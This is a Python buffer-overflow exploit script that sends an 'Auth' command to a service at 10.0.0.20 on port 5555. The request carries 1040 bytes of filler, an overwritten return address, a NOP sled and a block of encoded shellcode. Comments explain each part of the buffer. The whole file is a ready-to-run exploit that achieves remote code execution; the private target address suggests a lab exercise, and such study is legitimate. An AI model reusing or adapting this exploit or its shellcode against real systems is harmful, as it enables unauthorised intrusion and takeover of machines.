#!/usr/bin/python
import socket

# Define the payload (shellcode) to be sent
buf =  b""
buf += b"\xdb\xc2\xb8\x5f\x42\x1f\x9a\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x59\x31\x46\x1a\x83\xc6\x04\x03\x46"
buf += b"\x16\xe2\xaa\x99\xd9\x25\x25\x60\x3f\x30\x1c\xe8"
buf += b"\x9b\x37\xc5\x20\x2d\x06\xaa\x73\xd6\x7e\xcf\x9f"
buf += b"\xd4\x82\xc5\x32\x1e\x19\xc9\xb5\x59\x7e\x01\x3f"
buf += b"\xc4\x69\xdc\x8b\xa6\xe4\x98\xf7\x39\x32\x2e\xf9"
buf += b"\xc3\x37\x90\x7b\xa3\x43\x5d\x58\xf2\x3e\x61\x2b"
buf += b"\x81\xf8\x06\x62\xf0\x9e\x47\x8d\xb5\x4e\xc9\xde"
buf += b"\xf1\x8c\xe7\xf9\x4b\x24\xc5\xd7\x25\x43\xa0\x5a"
buf += b"\x24\x5f\xbc\x93\x79\x65\xc1\x97\x01\x05\x61\xa6"
buf += b"\x02\xa0\xdb\x6f\xdf\xa4\x2a\x4c\xe9\x55\xdf\xa0"
buf += b"\xdb\x75\x05\x18\xda\x9a\xa2\x5f\xe7\xc9\x81\x2b"
buf += b"\xd0\x62\x8b\xd2\xcd\x82\xfb\x7a\x21\x28\x67\x2a"
buf += b"\xf6\xf1\xc0\x95\x07\x43\xd1\x6a\xec\xca\x19\x12"
buf += b"\x61\xd3\xfb\xe5\xac\x11\xc5\xa4\xc3\x3e\x5e\x78"
buf += b"\xbc\x66\xd7\x66\xe1\x6b\xeb\x6a\x13\x19\x4c\x2f"
buf += b"\xdd\x9d\x2d\x55\x49\x68\xfd\xc1\xbd\xf8\x47\x91"
buf += b"\x72\xaa\x8a\x74\x98\xa0\x25\x61\x48\xdb\x3d\x4f"
buf += b"\x33\x1f\x2f\x84\x5d\x88\x2d\x9d\xa1\x7a\xdb\x02"
buf += b"\x4e\xf4\x8c\xa2\x2e\xc0\x85\x14\x24\x90\x81\x4c"
buf += b"\x8d\xf5\x50\x0c\xa6\x6e\x5d\xe4\xf3\xec\x44\xe2"
buf += b"\x7a\xd8\x57\xca\x8b\x0b\x11\xc9\xae\x92\x7d\x66"
buf += b"\x66\x4b\x72\x15\x95\x9d\x0b\x02\xd7\xa3\xa5\x3a"
buf += b"\x46\x46\x66\xa4\x63\x65\xfa\x34\xa5\x47\x8e\x87"
buf += b"\x0d\x22\xea\x54\xcd\x2c\x21\x4d\x19\xd7\x74\x89"
buf += b"\x27\xf5\xd1\x43\xf0\xe4\x7e\x6e\xdb\xb5\xea\xa9"
buf += b"\x33\x3d\x96\x24\xac\xc2\x4e\x8a\x03\x99\x08\xbf"
buf += b"\x25\x0d\x64\xa2\x40\xb4\x90\xd1\x3e\x01\xfa\xe9"
buf += b"\x72\xbe\x70\x5c\x1f\xd7\x31\x3d\x25\xc9\xf7\x5c"
buf += b"\x43\x17\x02\x7a\xde\x73\x0b\x76\x3d\xf6\xc1\x88"
buf += b"\x6f\x73\xec\xd8\x38\x7d\x55\xcd\x6a\x97\x67\x26"
buf += b"\x9b\x08\x54\x76\x3a\x5c\xd9\x8e\x3e\xc2"

# Print the length of the shellcode
print(len(buf))

# Define the exploit buffer
# "A"*1040: Filler to reach the offset where the return address is located
# "\x71\x1d\xd1\x65": Address to overwrite the return address (Little Endian format)
# "\x90"*8: NOP sled (No Operation instructions to ensure safe landing space)
# buf: Shellcode
# "\x90"*10: Additional NOPs for safe padding
buffer = ["A"*1040 + "\x71\x1d\xd1\x65" + "\x90"*8 + buf + "\x90"*10]  # Address: 65d11d71


for string in buffer:							# Iterate over the buffer list (in this case, it contains only one element)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		# Create a socket object
    
    
    connect = s.connect(('10.0.0.20', 5555))				# Connect to the target machine at the specified IP and port
    
    
    s.recv(1024)							# Receive any initial data from the server (up to 1024 bytes)
    
   
    s.send('Auth ' + string + '\r\n')	 				# Send the crafted buffer to the target with an 'Auth ' prefix
    
    
    print("%s chars were sent" % len(string))				# Print the length of the sent string
    
    # Close the socket connection
    s.close()
